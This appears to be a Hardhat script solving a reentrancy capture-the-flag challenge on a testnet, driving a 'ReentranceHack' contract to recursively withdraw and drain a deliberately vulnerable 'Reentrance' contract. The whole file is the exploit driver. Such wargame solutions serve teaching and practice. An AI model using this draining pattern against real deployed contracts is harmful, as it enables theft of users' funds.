import { ethers } from "hardhat";

async function main(){

    // my rinkeby address
    let player = "0x87955711F08521Eb054f9354371eC38713f236ee";

    // reentrance address
    let address_a = "0x225745CFA2d81354C6608f6f083aA0d39B31e95F";

    // our hack contract address
    let address_b = "0xEe4983761791AF188dd1d93CCEf83Aa663351758";

    let signer = await ethers.getSigner(player);
    let contract_a = await ethers.getContractAt("Reentrance", address_a, signer);
    let contract_b = await ethers.getContractAt("ReentranceHack",address_b,signer);

    // send 0.0001 ether to our hack contract to call the donate function
    await signer.sendTransaction({to: address_b, value: ethers.utils.parseEther("0.0001")});

    // donate to self
    await contract_b.donate()

    // call recursive withdraw with custom gas fees
    let tx = await contract_b.attack({maxPriorityFeePerGas: 5*10**9-100, maxFeePerGas: 10 * 10**9, gasLimit: 4000000});
    // check and ensure that transaction was successful
    console.log(tx);
    
    // confirm that target contract is drained
    console.log(await contract_a.provider.getBalance(address_a));

}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
